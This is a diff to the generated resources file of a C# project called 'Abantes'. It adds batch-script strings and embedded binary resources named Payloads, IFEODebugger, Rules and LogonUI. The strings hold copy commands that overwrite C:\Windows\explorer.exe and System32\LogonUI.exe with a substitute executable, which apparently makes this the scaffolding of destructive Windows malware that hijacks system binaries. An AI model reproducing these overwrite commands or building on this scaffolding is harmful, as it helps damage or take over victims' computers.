@@ -94,7 +94,10 @@ namespace Abantes.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to .
+        ///   Looks up a localized string similar to @echo on
+        ///cd\
+        ///copy &quot;C:\Windows\Defender\LogonUIStart.exe&quot; &quot;C:\Windows\explorer.exe&quot; /Y
+        ///copy %temp%\LogonUi.exe &quot;C:\Windows\Temp\LogonUi.exe&quot; /Y.
         /// </summary>
         internal static string ExplorerOverWrite {
             get {
@@ -113,9 +116,19 @@ namespace Abantes.Properties {
         }
         
         /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] IFEODebugger {
+            get {
+                object obj = ResourceManager.GetObject("IFEODebugger", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
         ///   Looks up a localized string similar to @echo on
         ///cd\
-        ///copy &quot;C:\Windows\Defender\LogonUIStart.exe&quot; &quot;C:\Windows\system32\LogonUI.exe&quot; /Y
+        ///copy &quot;C:\Windows\Defender\LogonUIStart.exe&quot; &quot;C:\Windows\System32\LogonUI.exe&quot; /Y
         ///copy %temp%\LogonUi.exe &quot;C:\Windows\Temp\LogonUi.exe&quot; /Y.
         /// </summary>
         internal static string LogonOverwrite {
@@ -127,10 +140,50 @@ namespace Abantes.Properties {
         /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
+        internal static byte[] LogonUI {
+            get {
+                object obj = ResourceManager.GetObject("LogonUI", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
         internal static byte[] LogonUI_Start {
             get {
                 object obj = ResourceManager.GetObject("LogonUI_Start", resourceCulture);
                 return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] Payloads {
+            get {
+                object obj = ResourceManager.GetObject("Payloads", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] Rules {
+            get {
+                object obj = ResourceManager.GetObject("Rules", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Drawing.Bitmap.
+        /// </summary>
+        internal static System.Drawing.Bitmap wallpaper {
+            get {
+                object obj = ResourceManager.GetObject("wallpaper", resourceCulture);
+                return ((System.Drawing.Bitmap)(obj));
             }
         }
     }
